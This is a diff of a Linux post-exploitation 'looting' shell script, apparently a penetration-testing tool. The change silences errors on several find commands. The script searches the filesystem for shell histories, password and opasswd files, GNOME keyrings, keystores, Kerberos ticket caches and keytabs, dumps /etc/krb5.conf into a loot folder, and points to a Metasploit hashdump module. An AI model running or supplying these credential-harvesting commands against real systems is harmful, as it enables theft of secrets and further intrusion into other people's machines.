@@ -119,12 +119,12 @@ looting() {
     echo "======================= HISTORY FILES (.bash_history):" | tee -a loot/files_to_check.txt
     find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
     echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
-    find / -name "password" | tee -a loot/files_to_check.txt
+    find / -name "password" 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= OLD PASSWORDS:" | tee -a loot/files_to_check.txt
     find / -name "opasswd" 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= GNOME KEYRING - cracking:" | tee -a loot/files_to_check.txt
-    find / -name "login.keyring" | tee -a loot/files_to_check.txt
-    find / -name "user.keystore" | tee -a loot/files_to_check.txt
+    find / -name "login.keyring" 2>/dev/null | tee -a loot/files_to_check.txt
+    find / -name "user.keystore" 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
     env | grep KRB5CCNAME | tee -a loot/kerberos.txt
     find / -name "krb5cc_*" 2>/dev/null
@@ -134,7 +134,6 @@ looting() {
     find / -name "*.keytab" 2>/dev/null | tee -a loot/kerberos.txt
     echo "======================= KERBEROS - CONFIG" | tee -a loot/kerberos.txt
     cat  /etc/krb5.conf | tee -a loot/kerberos.txt
-
 
     echo "======================= ADDITIONAL MSF MODULES:
 run post/linux/gather/hashdump
